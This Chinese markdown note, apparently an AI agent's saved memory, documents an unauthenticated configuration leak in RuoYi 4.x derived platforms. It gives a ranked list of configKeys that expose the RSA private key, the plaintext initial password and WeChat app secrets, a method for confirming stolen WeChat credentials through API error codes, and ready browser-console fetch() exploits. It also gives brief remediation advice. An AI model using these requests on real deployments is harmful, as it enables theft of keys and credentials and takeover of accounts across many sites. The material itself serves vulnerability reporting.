# RuoYi 系 getConfig 未授权配置泄露（通杀杀链）

> 源：zcode memory/ruoyi-getconfig-unauth.md（微霞云"离退休/工会"平台，RuoYi 4.7.4 二开实战验证）。
> 本文件只保存方法/参数名/判定语义，不落明文 secret。

## 认什么

| 信号 | 说明 |
|------|------|
| RuoYi 系框架（4.x 含各厂商二开） | F12 Network 见 `/system/config/getConfig` 或同类"按 configKey 取配置"接口 |
| 前端 `login.js`/`ry-ui.js` 调 `configKey=rsa.publicKey` 取公钥 | getConfig 本意下发公钥给登录页 |
| 登录页标题含"离退休/工会/信息化平台"等厂商套壳特征 | 同一厂商多部署 → 一处漏洞通杀多站 |

## 打哪

接口：`POST /system/config/getConfig`，body `configKey=<key>`（form 编码）。

**configKey 字典（按危害排序）：**

| configKey | 泄露内容 | 危害 |
|---|---|---|
| `rsa.publicKey` | RSA 公钥 | 对照基线（公开项） |
| `rsa.privateKey` | 完整 2048 位 PKCS#8 RSA 私钥 | 解密所有经 RSA 加密的登录密码，密码体系失守 |
| `sys.user.initPassword` | 系统用户初始密码明文 | 未改初始密码的账号直接登后台 |
| `wx.appid` / `wx.appsecret` | 微信公众号凭证 | 换 access_token 接管公众号 |
| 其他 `*.secret / *.privateKey / *.initPassword` | 视产品二开补充字典 | 逐产品扩 |

## 出什么算成（实锤判定）

**认钥闸必须过**——错误码语义区分"有效但受限" vs "无效"：

- 微信 token API `https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credentials&appid=<>&secret=<>`：
  - `errcode:40164`（invalid ip not in whitelist）= **凭证有效**（仅 IP 白名单挡；能走到这步=凭证校验通过）→ 40164 即"理论泄露"升级为"确认可利用"
  - `errcode:40001`（invalid credential）= 凭证无效
- 未授权证明：无痕窗口（无 session）直接 POST 成功返回；需登录态才返回 = 不算未授权

**产品级 vs 单点**：厂商演示站 + 多部署点复现（部分部署共用厂商测试公众号），证明产品缺陷而非单点配置失误 → 定级与修复范围提升。

## 复现 fetch 片段（无痕窗口 F12 Console，从目标自身 Origin 发起）

```js
fetch('/system/config/getConfig',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'configKey=sys.user.initPassword'}).then(r=>r.json()).then(d=>console.log(JSON.stringify(d)))
fetch('/system/config/getConfig',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'configKey=rsa.privateKey'}).then(r=>r.json()).then(d=>console.log(JSON.stringify(d)))
fetch('/system/config/getConfig',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'configKey=wx.appsecret'}).then(r=>r.json()).then(d=>console.log(JSON.stringify(d)))
```

## 修复建议（报告引用要点）

接口鉴权 + configKey 白名单（仅 rsa.publicKey 类公开键）+ 密钥轮换 + 初始密码治理 + 配置加密存储 + 厂商同类接口全面排查。

## 假点

- 私钥非空 ≠ 所有部署都有（需逐个验证）
- 返回的 appsecret 是厂商测试号占位值（40164 实锤仍算产品级缺陷）
